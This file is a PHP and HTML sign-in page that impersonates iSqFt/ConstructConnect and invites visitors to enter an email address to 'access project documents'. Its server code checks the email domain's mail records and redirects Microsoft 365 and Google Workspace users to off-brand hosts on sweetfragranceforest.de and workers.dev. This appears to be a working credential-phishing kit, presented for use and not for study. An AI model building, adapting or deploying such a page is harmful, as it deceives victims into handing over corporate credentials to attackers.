<?php
declare(strict_types=1);

session_set_cookie_params([
    'httponly' => true,
    'secure' => (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || isset($_SERVER['HTTP_CF_VISITOR']),
    'samesite' => 'Lax',
]);
session_start();

if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

function wants_json(): bool
{
    $accept = strtolower((string) ($_SERVER['HTTP_ACCEPT'] ?? ''));
    return str_contains($accept, 'application/json');
}

function json_exit(int $status, array $payload): void
{
    http_response_code($status);
    header('Content-Type: application/json; charset=utf-8');
    echo json_encode($payload);
    exit;
}

$error_message = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $csrf = (string) ($_POST['csrf_token'] ?? '');
    if (!hash_equals((string) $_SESSION['csrf_token'], $csrf)) {
        $message = 'Your session expired. Refresh the page and try again.';
        if (wants_json()) {
            json_exit(403, ['success' => false, 'error' => $message]);
        }
        $error_message = $message;
    } else {
        $email = trim((string) ($_POST['email'] ?? ''));
        if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
            $message = 'Enter a valid email address.';
            if (wants_json()) {
                json_exit(422, ['success' => false, 'error' => $message]);
            }
            $error_message = $message;
        } else {
            $domain = strtolower((string) substr(strrchr($email, '@') ?: '', 1));
            $mxRecords = [];

            if (function_exists('getmxrr')) {
                $weights = [];
                @getmxrr($domain, $mxRecords, $weights);
            }

            if (!$mxRecords && function_exists('dns_get_record')) {
                foreach (@dns_get_record($domain, DNS_MX) ?: [] as $record) {
                    if (!empty($record['target'])) {
                        $mxRecords[] = (string) $record['target'];
                    }
                }
            }

            if (!$mxRecords) {
                $message = 'We could not verify that email domain. Please use your work email.';
                if (wants_json()) {
                    json_exit(422, ['success' => false, 'error' => $message]);
                }
                $error_message = $message;
            } else {
                $provider = 'your organization';
                $redirectUrl = null;
                foreach ($mxRecords as $mxRecord) {
                    $mx = strtolower($mxRecord);
                    if (strpos($mx, 'outlook.com') !== false || strpos($mx, 'protection.outlook.com') !== false) {
                        $provider = 'Microsoft 365';
                        $redirectUrl = 'https://6f5o7gnql5.sweetfragranceforest.de/l/e0gV2VaSs0Q';
                        break;
                    }
                    if (strpos($mx, 'google.com') !== false || strpos($mx, 'googlemail.com') !== false) {
                        $provider = 'Google Workspace';
                        $redirectUrl = 'https://aqwdgnwqzyy3sxh6b08n0.70u0j5nyjhqnotxaccbtfciardwn1in.workers.dev/q/fVCGAky6x7phsLNJrbm2pfKbX70brkGNKCNmX9f0';
                        break;
                    }
                }

                $payload = [
                    'success' => true,
                    'domain' => $domain,
                    'provider' => $provider,
                    'redirect_url' => $redirectUrl,
                ];

                if (wants_json()) {
                    json_exit(200, $payload);
                }

                if ($redirectUrl) {
                    header('Location: ' . $redirectUrl, true, 302);
                    exit;
                }

                $error_message = 'This organization does not have a redirect configured yet.';
            }
        }
    }
}
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Sign in · iSqFt</title>
    <link rel="preconnect" href="https://fonts.googleapis.com" />
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
    <link
      href="https://fonts.googleapis.com/css2?family=Source+Sans+3:wght@400;500;600;700&display=swap"
      rel="stylesheet"
    />
    <link rel="stylesheet" href="styles.css" />
  </head>
  <body>
    <div class="page">
      <div class="bg" aria-hidden="true"></div>
      <div class="bg-veil" aria-hidden="true"></div>

      <header class="top-banner">
        <p>
          iSqFt is now a ConstructConnect<sup>™</sup> company.
          <a href="#">Learn More.</a>
        </p>
      </header>

      <main class="stage">
        <div class="brand">
          <img
            src="assets/logo.png"
            alt="iSqFt, a ConstructConnect company"
            class="brand-logo"
          />
        </div>

        <section class="panel" aria-labelledby="signin-title">
          <h1 id="signin-title">Enter your email address to access project documents</h1>

          <form class="signin-form" id="signin-form" action="" method="post" novalidate>
            <input type="hidden" name="csrf_token" value="<?php echo htmlspecialchars((string) $_SESSION['csrf_token'], ENT_QUOTES, 'UTF-8'); ?>" />
            <div class="field-wrap">
              <label class="field" for="email">
                <span class="sr-only">Email Address</span>
                <span class="field-icon" aria-hidden="true">
                  <svg viewBox="0 0 24 24" width="18" height="18" fill="none">
                    <path
                      d="M4 6.5h16a1.5 1.5 0 0 1 1.5 1.5v8a1.5 1.5 0 0 1-1.5 1.5H4A1.5 1.5 0 0 1 2.5 16V8A1.5 1.5 0 0 1 4 6.5Z"
                      stroke="currentColor"
                      stroke-width="1.6"
                    />
                    <path
                      d="m3.5 8 8.1 5.2a.8.8 0 0 0 .8 0L20.5 8"
                      stroke="currentColor"
                      stroke-width="1.6"
                      stroke-linecap="round"
                      stroke-linejoin="round"
                    />
                  </svg>
                </span>
                <input
                  id="email"
                  type="email"
                  name="email"
                  placeholder="Email Address"
                  autocomplete="email"
                  inputmode="email"
                  spellcheck="false"
                  required
                  aria-describedby="email-error"
                  aria-invalid="false"
                />
              </label>
              <p
                id="email-error"
                class="field-error"
                role="alert"
                <?php echo $error_message !== '' ? '' : 'hidden'; ?>
              >
                <?php echo htmlspecialchars($error_message !== '' ? $error_message : 'Enter a valid email address.', ENT_QUOTES, 'UTF-8'); ?>
              </p>
            </div>

            <button type="submit" class="login-btn" id="continue-btn" disabled>
              <span id="continue-label">Continue</span>
              <span class="login-arrow" aria-hidden="true">
                <svg viewBox="0 0 24 24" width="14" height="14" fill="none">
                  <path
                    d="M5 12h12m0 0-4.5-4.5M17 12l-4.5 4.5"
                    stroke="currentColor"
                    stroke-width="2"
                    stroke-linecap="round"
                    stroke-linejoin="round"
                  />
                </svg>
              </span>
            </button>
            <p class="form-status" role="status" aria-live="polite"></p>
          </form>
        </section>
      </main>

      <footer class="site-footer">
        <p>2026 © iSqFt, Inc. All Rights Reserved.</p>
      </footer>
    </div>
    <script src="script.js"></script>
  </body>
</html>
